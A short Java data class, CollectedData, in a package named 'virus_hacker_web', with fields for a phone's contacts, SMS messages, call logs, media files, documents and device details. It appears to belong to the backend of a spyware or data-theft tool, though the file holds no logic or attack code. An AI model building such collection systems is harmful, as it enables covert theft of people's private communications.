package com.tools.virus_hacker_web.dto;

import lombok.Data;

import java.util.List;

@Data
public class CollectedData {
    private List<ContactInfo> contacts;
    private List<SmsInfo> sms;
    private List<CallLogInfo> callLogs;
    private List<MediaFileInfo> mediaFiles;
    private List<DocumentInfo> documents;
    private DeviceInfo deviceInfo;
}
